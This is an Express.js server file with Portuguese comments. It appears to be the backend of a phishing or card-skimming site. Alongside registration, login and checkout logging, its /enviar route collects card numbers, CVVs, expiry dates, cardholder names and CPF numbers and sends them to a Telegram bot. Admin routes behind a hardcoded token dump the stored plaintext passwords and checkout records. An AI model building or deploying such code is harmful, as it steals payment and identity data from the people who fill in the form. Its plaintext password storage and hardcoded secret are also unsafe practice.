const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require("node-fetch");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // para formulários

// Serve arquivos estáticos da pasta "site"
app.use(express.static(path.join(__dirname, 'site')));

// Redireciona / para o index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'site', 'index.html'));
});

// ===================== REGISTRO =====================
const usersFile = './users.txt';

app.post('/register', (req, res) => {
  const { username, password, fullname } = req.body;

  if (!username || !password || !fullname) {
    return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
  }

  if (fs.existsSync(usersFile)) {
    const existingUsers = fs.readFileSync(usersFile, 'utf-8').split('\n');
    const exists = existingUsers.some(line => {
      const [savedUsername] = line.split('|');
      return savedUsername === username;
    });

    if (exists) {
      return res.json({ success: false, message: 'Usuário já existe.' });
    }
  }

  const userLine = `${username}|${password}|${fullname}\n`;
  fs.appendFileSync(usersFile, userLine);
  res.json({ success: true });
});

// ===================== LOGIN =====================
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.json({ success: false, message: 'Informe usuário e senha.' });
  }

  fs.readFile('./users.txt', 'utf8', (err, data) => {
    if (err) {
      console.error('Erro ao ler users.txt:', err);
      return res.json({ success: false, message: 'Erro no servidor.' });
    }

    const users = data.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(line => {
        const parts = line.split('|');
        return {
          username: parts[0],
          password: parts[1],
          fullname: parts[2]
        };
      });

    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
      res.json({ success: true, fullname: user.fullname });
    } else {
      res.json({ success: false, message: 'Usuário ou senha inválidos.' });
    }
  });
});

// ===================== TELEGRAM ENVIO =====================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!TELEGRAM_TOKEN || !CHAT_ID) {
  console.warn("⚠️ AVISO: TELEGRAM_TOKEN ou CHAT_ID não configurados nas variáveis de ambiente!");
}

app.post("/enviar", async (req, res) => {
  try {
    const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;

    const mensagem = `
💳 Novo Cartão:
Número: ${cardNumber}
CVV: ${cardcvvName}
Validade: ${expiry}
Nome: ${cardholderNameC}
Cpf: ${cardholderIdentificationNumber}
    `;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensagem
      })
    });

    const data = await response.json();
    console.log("📩 Resposta do Telegram:", data);

    if (!data.ok) {
      res.status(500).send(`Erro do Telegram: ${data.description}`);
    } else {
      res.send("Mensagem enviada com sucesso para o Telegram!");
    }
  } catch (error) {
    console.error("❌ Erro no envio:", error.message, error.stack);
    res.status(500).send("Erro no servidor");
  }
});

// ===================== CHECKOUT (salvar dados) =====================
app.post("/checkout", (req, res) => {
  const { nome, email, valor } = req.body;

  const linha = `${new Date().toISOString()} - ${nome} | ${email} | ${valor}\n`;

  fs.appendFile(path.join(__dirname, "checkout.txt"), linha, (err) => {
    if (err) {
      return res.status(500).send("Erro ao salvar checkout");
    }
    res.send("Checkout registrado com sucesso ✅");
  });
});

// ===================== ADMIN - USERS =====================
app.get("/admin/users", (req, res) => {
  const token = req.query.token;
  if (token !== "MOUSEPADGAFANHOTO") {
    return res.status(403).send("Acesso negado");
  }

  const filePath = path.join(__dirname, "users.txt");
  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Erro ao ler users.txt");
    }
    res.type("text/plain").send(data);
  });
});

// ===================== ADMIN - CHECKOUTS =====================
app.get("/admin/checkouts", (req, res) => {
  const token = req.query.token;
  if (token !== "MOUSEPADGAFANHOTO") {
    return res.status(403).send("Acesso negado");
  }

  const filePath = path.join(__dirname, "checkout.txt");
  fs.readFile(filePath, "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Erro ao ler checkout.txt");
    }
    res.type("text/plain").send(data);
  });
});

// ===================== INICIA SERVIDOR =====================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
